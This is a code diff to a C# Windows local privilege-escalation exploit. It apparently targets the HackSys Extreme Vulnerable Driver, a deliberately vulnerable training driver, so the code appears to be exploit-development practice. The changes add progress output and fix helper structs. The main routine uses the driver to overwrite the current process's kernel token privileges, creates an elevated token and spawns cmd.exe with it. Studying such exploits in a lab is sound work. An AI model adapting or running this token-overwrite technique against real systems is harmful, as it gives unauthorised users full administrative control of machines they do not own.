@@ -469,10 +469,10 @@ namespace CreateAssignTokenVariant
         [StructLayout(LayoutKind.Sequential)]
         struct SECURITY_QUALITY_OF_SERVICE
         {
-            readonly int Length;
-            readonly SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
-            readonly byte ContextTrackingMode;
-            readonly byte EffectiveOnly;
+            public int Length;
+            public SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
+            public byte ContextTrackingMode;
+            public byte EffectiveOnly;
 
             public SECURITY_QUALITY_OF_SERVICE(
                 SECURITY_IMPERSONATION_LEVEL _impersonationLevel,
@@ -650,9 +650,17 @@ namespace CreateAssignTokenVariant
                 buffer = IntPtr.Zero;
             }
 
+            public void SetBuffer(IntPtr _buffer)
+            {
+                buffer = _buffer;
+            }
+
             public override string ToString()
             {
-                return Marshal.PtrToStringUni(buffer);
+                if ((Length == 0) || (buffer == IntPtr.Zero))
+                    return null;
+                else
+                    return Marshal.PtrToStringUni(buffer, Length / 2);
             }
         }
 
@@ -1428,22 +1436,27 @@ namespace CreateAssignTokenVariant
             if (!Environment.Is64BitOperatingSystem)
             {
                 Console.WriteLine("[!] 32 bit OS is not supported.\n");
-
                 return;
             }
             else if (IntPtr.Size != 8)
             {
                 Console.WriteLine("[!] Should be built with 64 bit pointer.\n");
-
                 return;
             }
 
-            IntPtr tokenPointer = GetCurrentProcessTokenPointer();
+            Console.WriteLine("[*] Current account is \"{0}\\{1}\"", Environment.UserDomainName, Environment.UserName);
+            Console.WriteLine("[>] Trying to find token address for this process.");
 
-            if (tokenPointer == IntPtr.Zero)
+            IntPtr pTokenPointer = GetCurrentProcessTokenPointer();
+
+            if (pTokenPointer == IntPtr.Zero)
             {
                 Console.WriteLine("[-] Failed to find nt!_TOKEN.");
                 return;
+            }
+            else
+            {
+                Console.WriteLine("[+] nt!_TOKEN for this process @ 0x{0}", pTokenPointer.ToString("X16"));
             }
 
             string deviceName = "\\\\.\\HacksysExtremeVulnerableDriver";
@@ -1453,14 +1466,13 @@ namespace CreateAssignTokenVariant
             if (hDevice == IntPtr.Zero)
             {
                 Console.WriteLine("[-] Failed to open {0}", deviceName);
-
                 return;
             }
 
             var privs = (ulong)(SepTokenPrivilegesFlags.CREATE_TOKEN |
                 SepTokenPrivilegesFlags.ASSIGNPRIMARYTOKEN);
 
-            OverwriteTokenPrivileges(hDevice, tokenPointer, privs);
+            OverwriteTokenPrivileges(hDevice, pTokenPointer, privs);
             CloseHandle(hDevice);
 
             IntPtr hElevatedToken = CreateElevatedToken(
@@ -1470,9 +1482,7 @@ namespace CreateAssignTokenVariant
             if (hElevatedToken == IntPtr.Zero)
                 return;
 
-            CreateTokenAssignedProcess(
-                hElevatedToken,
-                "C:\\Windows\\System32\\cmd.exe");
+            CreateTokenAssignedProcess(hElevatedToken, "C:\\Windows\\System32\\cmd.exe");
 
             CloseHandle(hElevatedToken);
         }
